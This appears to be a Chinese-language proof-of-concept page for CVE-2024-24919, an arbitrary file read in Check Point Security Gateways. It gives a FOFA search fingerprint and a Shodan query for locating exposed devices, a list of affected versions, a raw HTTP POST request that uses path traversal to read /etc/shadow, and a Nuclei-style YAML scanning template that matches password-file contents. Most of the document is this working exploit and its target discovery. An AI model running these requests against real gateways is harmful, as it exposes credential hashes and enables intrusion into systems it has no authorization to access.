## Check-Point安全网关任意文件读取漏洞(CVE-2024-24919)

Check Point Security Gateways 是 Check Point Software 提供的一系列网络安全解决方案。这些解决方案包括下一代防火墙（NGFW）、数据中心安全网关和 AI 驱动的量子网关，旨在为企业提供针对复杂网络威胁的先进防护。它们通过集成的威胁防护、统一的安全管理和策略控制，确保网络、云、移动和端点的安全。

## fofa

```
icon_hash="1440532452"
```

## 影响版本

```
Check Point Security Gateways R77.20 (EOL)
Check Point Security Gateways R77.30 (EOL)
Check Point Security Gateways R80.10 (EOL)
Check Point Security Gateways R80.20 (EOL)
Check Point Security Gateways R80.20.x
Check Point Security Gateways R80.20SP (EOL)
Check Point Security Gateways R80.30 (EOL)
Check Point Security Gateways R80.30SP (EOL)
Check Point Security Gateways R80.40 (EOL)
Check Point Security Gateways R81
Check Point Security Gateways R81.10
Check Point Security Gateways R81.10.x
Check Point Security Gateways R81.20
```

## poc

```
POST /clients/MyCRL HTTP/1.1
Host: ip
Content-Length: 39

aCSHELL/../../../../../../../etc/shadow
```

![image-20240530235057951](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405302350018.png)



## poc yaml

```
id: CVE-2024-24919

info:
  name: Check Point Quantum Gateway - Information Disclosure
  author: johnk3r
  severity: high
  description: |
    CVE-2024-24919 is an information disclosure vulnerability that can allow an attacker to access certain information on internet-connected Gateways which have been configured with IPSec VPN, remote access VPN or mobile access software blade.
  reference:
    - https://labs.watchtowr.com/check-point-wrong-check-point-cve-2024-24919/
    - https://support.checkpoint.com/results/sk/sk182337
  metadata:
    max-request: 1
    vendor: checkpoint
    product: quantum_security_gateway
    cpe: cpe:2.3:h:checkpoint:quantum_security_gateway:*:*:*:*:*:*:*:*
    shodan-query: html:"Check Point SSL Network"
    verified: true
  tags: cve,cve2024,checkpoint,lfi

http:
  - raw:
      - |
        POST /clients/MyCRL HTTP/1.1
        Host: {{Hostname}}
        
        aCSHELL/../../../../../../../etc/shadow
        
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:"
          - "nobody:"
        condition: and

      - type: status
        status:
          - 200
```

